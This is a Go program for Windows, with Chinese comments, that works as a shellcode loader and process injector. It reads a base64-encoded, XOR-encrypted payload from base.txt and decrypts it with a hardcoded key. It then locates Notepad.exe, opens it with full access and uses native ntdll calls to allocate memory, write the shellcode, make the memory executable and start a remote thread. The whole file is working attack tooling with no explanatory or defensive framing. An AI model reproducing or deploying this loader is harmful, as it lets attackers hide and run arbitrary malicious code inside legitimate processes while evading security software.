package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func echoPid() uint32 {
	snapshot, err :=
		syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer syscall.CloseHandle(snapshot)

	var pe32 syscall.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	if err = syscall.Process32First(snapshot, &pe32); err != nil {
		return 0
	}

	for {
		proceessName := syscall.UTF16ToString(pe32.ExeFile[:])
		if proceessName == "Notepad.exe" {
			ID := (pe32.ProcessID)
			fmt.Println(ID)
			return ID
		}

		err = syscall.Process32Next(snapshot, &pe32)
		if err == syscall.ERROR_NO_MORE_FILES {
			fmt.Println("未找到线程")
			return 0
		}
	}

}

func multiByteXOR(data []byte, key []byte) []byte {
	if len(key) == 0 {
		return data
	}
	
	result := make([]byte, len(data))
	keyLen := len(key)
	
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%keyLen]
	}
	
	return result
}

func main() {
	fileObj,err := os.ReadFile("base.txt")
	if err != nil {return}
	basecode := string(fileObj)
	xorcode,err := base64.StdEncoding.DecodeString(basecode)
	if err != nil {return}
	key := []byte("fxxk world")
	shellcode := multiByteXOR(xorcode, key)
	
	ntdll := syscall.MustLoadDLL("ntdll")
	NtWriteVirtualMemory := ntdll.MustFindProc("NtWriteVirtualMemory")
	NtAllocateVirtualMemory := ntdll.MustFindProc("NtAllocateVirtualMemory")
	NtProtectVirtualMemory := ntdll.MustFindProc("NtProtectVirtualMemory")
	NtOpenProcess := ntdll.MustFindProc("NtOpenProcess")
	NtCreateThreadEx := ntdll.MustFindProc("NtCreateThreadEx")

	pid := echoPid()

	//开启目标进程
	var handle windows.Handle
	type clientID struct{
		UniqueProcess uintptr
		UniqueThread uintptr
	}
	cid := clientID{UniqueProcess: uintptr(pid)}
	var objectAttributes windows.OBJECT_ATTRIBUTES
	status,_,_ := NtOpenProcess.Call(
		uintptr(unsafe.Pointer(&handle)),
		windows.PROCESS_ALL_ACCESS,
		uintptr(unsafe.Pointer(&objectAttributes)),
		uintptr(unsafe.Pointer(&cid)),
		)
	if status != 0 {
		fmt.Println("目标进程开启失败",status)
		return
	}

	//在目标进程分配内存
	var addr uintptr
	var size = uintptr(len(shellcode))
	status,_,_ = NtAllocateVirtualMemory.Call(
		uintptr(handle),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&size)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
		)
	if status != 0 {
		fmt.Println("分配内存错误")
		return
	}

	//写入shellcode
	var bytesWritten uintptr
	ret, _, _ := NtWriteVirtualMemory.Call(uintptr(handle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(&bytesWritten)))
	if ret != 0 {
		fmt.Println("写入失败")
		return
	}

	//修改内存执行权限
	var oldProtect uint32
	var regionSize = uintptr(len(shellcode))
	baseAddr := addr

	status, _, _ = NtProtectVirtualMemory.Call(uintptr(handle), uintptr(unsafe.Pointer(&baseAddr)),uintptr(unsafe.Pointer(&regionSize)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if status != 0 {
		fmt.Println("修改失败")
		return
	}

	//在目标进程中创建执行线程
	var threadHandle windows.Handle
	status, _, _ = NtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)),
		windows.GENERIC_ALL,
		0,
		uintptr(handle),
		addr,
		0,0,0,0,0,0,
		)
	if status != 0 {
		fmt.Println("创建失败")
		return
	}
}
